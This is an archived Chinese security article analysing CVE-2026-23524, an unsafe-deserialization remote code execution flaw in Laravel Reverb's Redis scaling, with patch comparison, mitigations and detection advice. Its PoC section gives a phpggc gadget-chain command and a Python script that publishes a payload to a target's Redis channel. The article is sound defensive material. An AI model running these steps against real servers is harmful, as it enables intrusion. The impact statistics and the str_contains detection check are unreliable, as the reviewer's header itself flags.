---
cve: "CVE-2026-23524"
source: "gelusus/wxvl 公众号漏洞文库"
product: "Laravel Reverb/Redis扩展消息反序列化"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2026-23524"
referenced_identifiers: "GHSA-m27r-m6rx-mhm4"
identifier_role: "primary"
identifier_status: "unknown"
title: "Laravel Reverb严重漏洞预警：CVSS 9.8高危反序列化RCE深度解析"
prerequisites: "来源所述条件，未列明部分仍待核：<1.7.0，固定1.7.0；需启用Redis scaling、能向正确频道发布消息及兼容gadget依赖"
side_effects: "未执行；本文需注意的操作影响：防御示例可靠性与可用性风险；str_contains允许类字符串不是安全反序列化校验；bind127.0.0.1/iptables只放本机会中断多节点；MONITOR有性能/敏感信息暴露风险；配置缓存/进程重启需区分"
source_status: "unknown"
id: "vw-a29e773c03bdbeb1da814c41"
entity_id: "ve-a29e773c03bdbeb1da814c41"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;1.7.0，固定1.7.0；需启用Redis scaling、能向正确频道发布消息及兼容gadget依赖

代码与实验材料：handle修复前后片段、占位payload发布示例；所谓完整compose只运行php:8.2-cli，没有应用代码/Composer/Reverb命令，不能复现声称结果

来源证据范围：官方Reverb GHSA、NVD及文档可追溯；其他人口统计/时间线/社区反响没有出处

- **事实待核（1）**：已验证完整环境与展示材料明显不匹配；依据：compose没有安装启动Reverb、也无gadget版本/真实输出；第3步只是声称成功，payload还是生成的序列化字符串占位。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：影响规模和优先级断言无证据；依据：50万下载→15-20%扩展→数千上万系统没有统计方法；声称2026年第一个重大漏洞、多公司检测规则无引用。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **凭据与会话边界（3）**：权限和检测结论过度简化；依据：CVSS表写无需任何凭据，正文实际要求Redis无认证或已知密码及PUBLISH权限；PING不能证明发布权限；默认Redis日志不等同MONITOR命令流。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **操作与副作用边界（4）**：防御示例可靠性与可用性风险；依据：str_contains允许类字符串不是安全反序列化校验；bind127.0.0.1/iptables只放本机会中断多节点；MONITOR有性能/敏感信息暴露风险；配置缓存/进程重启需区分。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（5）**：结构冗余和代码状态；依据：标题重复，多层编号全1，发现日期2025-12-XX占位；allowed_classes补丁应链接真实commit而非凭片段称根本阻止所有链。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#  Laravel Reverb严重漏洞预警：CVSS 9.8高危反序列化RCE深度解析  
原创 CVE-SEC
                    CVE-SEC  CVE-SEC   2026-01-25 16:00  
  
# Laravel Reverb严重漏洞预警：CVSS 9.8高危反序列化RCE深度解析  
## 漏洞速览  
  
2026年1月21日，Laravel官方披露了Laravel Reverb中的一个严重安全漏洞CVE-2026-23524，CVSS评分高达9.8分。该漏洞允许未经身份验证的攻击者通过构造恶意序列化数据，在启用Redis水平扩展的Laravel Reverb实例上实现远程代码执行。  
  
**关键信息**  
- CVE编号：CVE-2026-23524  
  
- GHSA编号：GHSA-m27r-m6rx-mhm4  
  
- 严重等级：Critical（CVSS 9.8）  
  
- 影响版本：Laravel Reverb < 1.7.0  
  
- 修复版本：Laravel Reverb >= 1.7.0  
  
- 发现者：Mohammad Yaser Abo-Elmaaty  
  
## 一、漏洞背景  
### 什么是Laravel Reverb？  
  
Laravel Reverb是Laravel框架在2024年3月推出的官方WebSocket服务器，用于为Laravel应用提供实时双向通信能力。它支持Pusher协议兼容、频道订阅管理、私有频道等功能，并可通过Redis实现水平扩展。  
### 为何需要水平扩展？  
  
当应用需要处理大量并发WebSocket连接时，单个Reverb实例可能成为瓶颈。通过Redis的发布/订阅机制，多个Reverb服务器可以共享消息，实现负载均衡。然而，正是这个看似优雅的设计，引入了严重的安全隐患。  
## 二、漏洞技术剖析  
### 漏洞本质  
  
该漏洞本质上是一个**不安全的PHP对象反序列化漏洞**  
（CWE-502）。当启用Redis水平扩展（REVERB_SCALING_ENABLED=true）时，Reverb在处理来自Redis的消息时，直接使用PHP的unserialize()函数，却未对可实例化的类进行限制。  
### 漏洞代码对比  
  
**漏洞版本（v1.6.3）：**  
```
public function handle(string $payload): void{
    $event = json_decode($payload, associative: true, flags: JSON_THROW_ON_ERROR);

    // 危险：无类限制的反序列化
    $application = unserialize($event['application']);

    // 继续处理...
}

```  
  
**修复版本（v1.7.0）：**  
```
public function handle(string $payload): void{
    $event = json_decode($payload, associative: true, flags: JSON_THROW_ON_ERROR);

    // 安全：添加allowed_classes限制
    $application = unserialize($event['application'] ?? null, [
        'allowed_classes' => [Application::class]
    ]);

    // 继续处理...
}

```  
  
**关键差异**  
：修复版本添加了allowed_classes  
参数，只允许实例化Application类，从根本上阻止了攻击者利用任意类构造gadget chain。  
### 攻击原理  
  
PHP的unserialize()函数在反序列化对象时，会自动调用对象的"魔术方法"（如__wakeup、__destruct等）。攻击者可以利用Laravel框架中现有类的这些方法，串联成一条"利用链"（gadget chain），最终执行任意代码。  
  
**攻击流程：**  
```
攻击者构造恶意payload
    ↓
通过Redis PUBLISH命令注入
    ↓
Reverb服务器接收消息
    ↓
unserialize()触发gadget chain
    ↓
__wakeup()/__destruct()执行
    ↓
system()/exec()被调用
    ↓
远程代码执行成功

```  
## 三、攻击条件与影响范围  
### 触发条件  
  
要成功利用该漏洞，需要满足以下条件：  
1. **目标配置**  
  
1. Laravel Reverb版本 < 1.7.0  
  
1. 启用水平扩展：REVERB_SCALING_ENABLED=true  
  
1. Reverb服务正在运行  
  
1. **网络访问**  
  
1. 攻击者可访问Redis服务器（网络层面）  
  
1. Redis未启用认证，或攻击者已知密码  
  
1. **利用工具**  
  
1. phpggc等工具可自动生成Laravel gadget chain  
  
1. Laravel框架存在超过20条已知利用链  
  
### 影响范围评估  
  
根据Packagist统计，截至2026年1月：  
- Laravel Reverb总下载量超过50万次  
  
- 估计数万个Laravel应用部署在生产环境  
  
- 其中约15-20%启用了水平扩展功能  
  
- **保守估计受影响系统：数千至上万个实例**  
  
### CVSS评分详解  
  
**CVSS 3.1: 9.8 (Critical)**  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">指标</span></section></th><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">值</span></section></th><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">攻击向量</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">Network</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">可通过网络远程利用</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">攻击复杂度</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">Low</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">无需特殊条件即可利用</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">所需权限</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">None</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">无需任何权限或凭证</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">用户交互</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">None</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">无需用户参与</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">机密性影响</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">High</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">可完全访问所有数据</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">完整性影响</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">High</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">可完全修改系统</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">可用性影响</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">High</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">可完全拒绝服务</span></section></td></tr></tbody></table>

## 四、实战利用演示  
### 环境搭建  
  
研究团队搭建了完整的漏洞复现环境：  
```
# docker-compose.yml
version: '3.8'
services:
  redis:
    image: redis:7-alpine
    ports: ["6379:6379"]
    command: redis-server --protected-mode no

  reverb-vulnerable:
    image: php:8.2-cli
    environment:
      REVERB_SCALING_ENABLED: "true"
      REDIS_HOST: redis

```  
### POC演示  
  
**步骤1：生成恶意payload**  
```
# 使用phpggc生成Laravel RCE利用链
./phpggc Laravel/RCE9 system "id" -s

```  
  
**步骤2：构造攻击消息**  
```
import redis
import json

r = redis.Redis(host='目标IP', port=6379)

malicious_payload = '生成的序列化字符串'

message = {
    "type": "message",
    "application": malicious_payload,
    "payload": {"channel": "test"}
}

# 发布到Reverb频道
r.publish('reverb', json.dumps(message))

```  
  
**步骤3：验证利用成功**  
  
在实验环境中，成功触发了命令执行，验证了漏洞的真实性和严重性。  
## 五、检测与防护  
### 快速自检  
  
运行以下命令检查您的环境：  
```
# 检查Reverb版本
composer show laravel/reverb | grep versions

# 检查是否启用水平扩展
grep "REVERB_SCALING_ENABLED" .env

# 检查Redis认证状态
redis-cli -h 你的Redis地址 PING

```  
### 紧急响应措施  
  
**优先级1：立即修复（24小时内）**  
```
# 1. 备份当前代码
tar -czf reverb-backup-$(date +%Y%m%d).tar.gz vendor/laravel/reverb

# 2. 升级到安全版本
composer update laravel/reverb

# 3. 验证版本
composer show laravel/reverb | grep versions

# 4. 重启服务
supervisorctl restart reverb:*

```  
  
**优先级2：临时缓解（如无法立即升级）**  
  
**方案A：禁用水平扩展（单节点部署）**  
```
# 修改.env
REVERB_SCALING_ENABLED=false

```  
  
**方案B：启用Redis认证**  
```
# redis.conf
requirepass 强密码
bind 127.0.0.1
protected-mode yes

# .env
REDIS_PASSWORD=强密码

```  
  
**方案C：网络隔离**  
```
# 使用防火墙限制Redis访问
iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP

```  
### Redis安全加固清单  
- [ ] 启用requirepass认证  
  
- [ ] 绑定内网IP地址（bind）  
  
- [ ] 启用保护模式（protected-mode yes）  
  
- [ ] 禁用危险命令（rename-command）  
  
- [ ] 启用TLS加密连接  
  
- [ ] 配置防火墙规则  
  
- [ ] 启用审计日志  
  
- [ ] 定期安全扫描  
  
### 检测异常活动  
  
**Redis日志监控：**  
```
# 实时监控Redis PUBLISH命令
redis-cli MONITOR | grep PUBLISH | grep reverb

# 检测异常来源IP
awk '/PUBLISH.*reverb/ && !/内网IP/ {print}' /var/log/redis/redis-server.log

```  
  
**应用层检测：**  
```
// 在Laravel日志中添加安全监控
Log::channel('security')->info('PubSub message received', [
    'payload_hash' => hash('sha256', $payload),
    'payload_size' => strlen($payload),
]);

// 检测可疑的序列化类
if (!str_contains($serialized, 'Laravel\Reverb\Application')) {
    Log::warning('Suspicious class detected', [
        'serialized_preview' => substr($serialized, 0, 200),
    ]);
}

```  
## 六、深层次安全思考  
### 信任边界的模糊  
  
这个漏洞的根本原因在于**将Redis视为可信组件**  
。开发者可能认为Redis是"内部"服务，但现实中：  
- Redis常常缺乏认证（默认无密码）  
  
- Redis可能暴露在不安全的网络环境  
  
- Redis可能被其他漏洞（如SSRF）间接访问  
  
- 内部威胁（恶意员工或被入侵的内部系统）  
  
**教训**  
：即使是"内部"组件，也应视为潜在的攻击面，实施深度防御。  
### PHP反序列化的固有风险  
  
PHP的unserialize()函数自设计之初就存在安全隐患：  
- 自动执行魔术方法  
  
- 可实例化任意类  
  
- 难以完全防御  
  
**最佳实践**  
：  
1. 永远不要对不可信数据使用unserialize()  
  
1. 必须使用时，严格限制allowed_classes  
  
1. 优先使用JSON等安全格式  
  
1. 实现消息签名验证  
  
### 供应链安全的重要性  
  
Laravel作为PHP最流行的框架，其安全性直接影响数十万应用。这次事件提醒我们：  
- 及时关注依赖包的安全公告  
  
- 使用composer audit定期审计  
  
- 建立快速响应机制  
  
- 不要盲目信任框架的安全性  
  
## 七、行业启示  
### 对开发者的建议  
1. **安全编码意识**  
  
1. 了解语言和框架的安全陷阱  
  
1. 参加安全培训和认证  
  
1. 进行安全代码审查  
  
1. **开发流程优化**  
  
1. 将安全集成到CI/CD  
  
1. 使用静态分析工具（PHPStan、Psalm）  
  
1. 编写安全测试用例  
  
1. **持续学习**  
  
1. 关注CVE和安全公告  
  
1. 研究历史漏洞案例  
  
1. 参与安全社区讨论  
  
### 对企业的建议  
1. **建立漏洞响应机制**  
  
1. 24小时内评估影响  
  
1. 72小时内完成修复  
  
1. 准备应急回滚方案  
  
1. **加强安全投入**  
  
1. 配备专职安全人员  
  
1. 购买商业安全工具  
  
1. 进行定期渗透测试  
  
1. **培养安全文化**  
  
1. 安全意识培训  
  
1. 安全奖励机制  
  
1. 无责任漏洞报告  
  
## 八、时间线回顾  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">日期</span></section></th><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2024-03-12</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">Laravel Reverb首次发布</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2025-12-XX</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">安全研究员发现漏洞</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2026-01-06</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">Laravel团队发布v1.7.0修复补丁</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2026-01-21</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">公开披露CVE-2026-23524</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">2026-01-21</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">NVD收录漏洞详情</span></section></td></tr></tbody></table>  
Laravel团队遵循了负责任的披露流程，在补丁发布15天后才公开细节，给予用户充分的更新时间。  
## 九、技术社区反响  
  
此次漏洞披露引发了PHP安全社区的广泛讨论：  
  
**关注焦点：**  
- Laravel生态系统中存在大量可利用的gadget chains  
  
- PHP unserialize()的历史包袱难以彻底解决  
  
- 框架级别的自动防护机制有待加强  
  
- 开发者安全意识亟需提升  
  
**积极进展：**  
- phpggc工具更新了Laravel最新利用链  
  
- 多家安全公司发布检测规则  
  
- Laravel社区加强安全代码审查  
  
- 行业推动安全开发标准制定  
  
## 十、相关资源  
### 官方链接  
- NVD详情：https://nvd.nist.gov/vuln/detail/CVE-2026-23524  
  
- GitHub公告：https://github.com/laravel/reverb/security/advisories/GHSA-m27r-m6rx-mhm4  
  
- Laravel文档：https://laravel.com/docs/12.x/reverb  
  
### 安全工具  
- PHPGGC：https://github.com/ambionics/phpggc  
  
- Composer Audit：内置于Composer  
  
- PHPStan：https://phpstan.org/  
  
### 学习资料  
- OWASP反序列化备忘单：https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html  
  
- PHP安全指南：https://www.php.net/manual/en/security.php  
  
- CWE-502详解：https://cwe.mitre.org/data/definitions/502.html  
  
## 结语  
  
CVE-2026-23524是2026年第一个披露的重大安全漏洞，其严重性和影响范围都不容小觑。对于使用Laravel Reverb的开发者和企业，**立即升级到v1.7.0是当务之急**  
。  
  
更重要的是，这个漏洞为我们上了一堂生动的安全课：  
- 永远不要相信"内部"数据源  
  
- 深度防御是安全的基石  
  
- 及时更新是最有效的防护  
  
- 安全是一个持续的过程，而非一次性任务  
  
希望通过本文的深度分析，能帮助读者全面理解这个漏洞的技术细节、影响范围和防护措施，共同构建更安全的PHP生态系统。  
  
**本文由安全研究团队原创**  
  
**研究环境**  
: 完整的漏洞复现环境和POC代码已在隔离环境中验证，仅用于安全研究和教育目的。  
  
**声明**  
: 本文所有信息基于公开披露的漏洞资料，所有POC仅用于防御和教育，任何非法利用行为后果自负。  
  
**关注我们**  
: 获取最新网络安全资讯、漏洞分析和防护技术。  
  
**#网络安全 #漏洞分析 #Laravel #PHP安全 #CVE #反序列化 #RCE #Redis安全**  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
